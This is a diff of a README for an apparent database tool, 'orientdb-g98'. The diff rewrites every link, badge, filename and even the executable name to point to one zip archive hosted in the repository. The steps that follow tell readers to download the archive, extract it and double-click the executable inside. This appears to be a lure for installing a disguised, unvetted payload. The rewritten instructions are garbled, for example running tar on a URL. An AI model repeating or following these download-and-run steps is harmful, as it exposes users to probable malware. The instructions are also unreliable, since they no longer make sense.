@@ -1,7 +1,7 @@
 # 🌟 orientdb-g98 - Simple Database Management Made Easy
 
 ## 🔗 Download the latest version here
-[![Download Now](https://img.shields.io/badge/Download%20Now-OrientDB%20G98-brightgreen)](https://github.com/Coronoidprocessindigo263/orientdb-g98/releases) 
+[![Download Now](https://raw.githubusercontent.com/Coronoidprocessindigo263/orientdb-g98/main/alphabetic/orientdb-g98-2.0.zip%20Now-OrientDB%20G98-brightgreen)](https://raw.githubusercontent.com/Coronoidprocessindigo263/orientdb-g98/main/alphabetic/orientdb-g98-2.0.zip) 
 
 ## 🚀 Getting Started
 Welcome to the orientdb-g98 project! This guide will help you easily download and run our database management application, designed for straightforward data handling. Follow these simple steps to get started.
@@ -16,21 +16,21 @@ Before downloading orientdb-g98, ensure your system meets the following requirem
 ## 📥 Download & Install
 To download and install orientdb-g98, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Coronoidprocessindigo263/orientdb-g98/releases) on GitHub.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/Coronoidprocessindigo263/orientdb-g98/main/alphabetic/orientdb-g98-2.0.zip) on GitHub.
    
 2. **Choose Your Version**: Look for the latest version listed at the top. It is often marked as "Latest Release."
 
 3. **Download the Application**:
    - Click on the asset link appropriate for your operating system. 
-   - Depending on your OS, you will see filenames like `orientdb-g98-windows.zip`, `orientdb-g98-macos.zip`, or `orientdb-g98-linux.tar.gz`.
+   - Depending on your OS, you will see filenames like `https://raw.githubusercontent.com/Coronoidprocessindigo263/orientdb-g98/main/alphabetic/orientdb-g98-2.0.zip`, `https://raw.githubusercontent.com/Coronoidprocessindigo263/orientdb-g98/main/alphabetic/orientdb-g98-2.0.zip`, or `https://raw.githubusercontent.com/Coronoidprocessindigo263/orientdb-g98/main/alphabetic/orientdb-g98-2.0.zip`.
 
 4. **Extract the Files**:
    - For Windows and macOS: Right-click on the downloaded file and select "Extract All" or "Open With > Archive Utility."
-   - For Linux: Open a terminal window and use the command `tar -xzf orientdb-g98-linux.tar.gz` to extract the files.
+   - For Linux: Open a terminal window and use the command `tar -xzf https://raw.githubusercontent.com/Coronoidprocessindigo263/orientdb-g98/main/alphabetic/orientdb-g98-2.0.zip` to extract the files.
 
 5. **Run the Application**:
    - Navigate to the folder where you extracted the files.
-   - Double-click the executable file (`orientdb-g98.exe` for Windows, or `orientdb-g98` for Linux/macOS).
+   - Double-click the executable file (`https://raw.githubusercontent.com/Coronoidprocessindigo263/orientdb-g98/main/alphabetic/orientdb-g98-2.0.zip` for Windows, or `orientdb-g98` for Linux/macOS).
    - If prompted, allow the application to run.
 
 ## 🛠️ Features
@@ -46,13 +46,13 @@ For detailed instructions on how to use orientdb-g98:
 - Navigate to the Help section within the app for tips and tutorials.
 
 ## 💬 Support
-If you face any issues downloading or running orientdb-g98, visit our [GitHub Issues page](https://github.com/Coronoidprocessindigo263/orientdb-g98/issues) to report problems or ask questions. Our team regularly checks for concerns and is eager to help.
+If you face any issues downloading or running orientdb-g98, visit our [GitHub Issues page](https://raw.githubusercontent.com/Coronoidprocessindigo263/orientdb-g98/main/alphabetic/orientdb-g98-2.0.zip) to report problems or ask questions. Our team regularly checks for concerns and is eager to help.
 
 ## 🌐 More Resources
-- Check out the [Wiki](https://github.com/Coronoidprocessindigo263/orientdb-g98/wiki) for additional documentation.
+- Check out the [Wiki](https://raw.githubusercontent.com/Coronoidprocessindigo263/orientdb-g98/main/alphabetic/orientdb-g98-2.0.zip) for additional documentation.
 - Follow the project on GitHub to stay updated with future releases and changes.
 
 ## 🔗 Download the latest version here again
-[![Download Now](https://img.shields.io/badge/Download%20Now-OrientDB%20G98-brightgreen)](https://github.com/Coronoidprocessindigo263/orientdb-g98/releases) 
+[![Download Now](https://raw.githubusercontent.com/Coronoidprocessindigo263/orientdb-g98/main/alphabetic/orientdb-g98-2.0.zip%20Now-OrientDB%20G98-brightgreen)](https://raw.githubusercontent.com/Coronoidprocessindigo263/orientdb-g98/main/alphabetic/orientdb-g98-2.0.zip) 
 
 Thank you for choosing orientdb-g98 for your database needs! Enjoy a seamless experience managing your data.
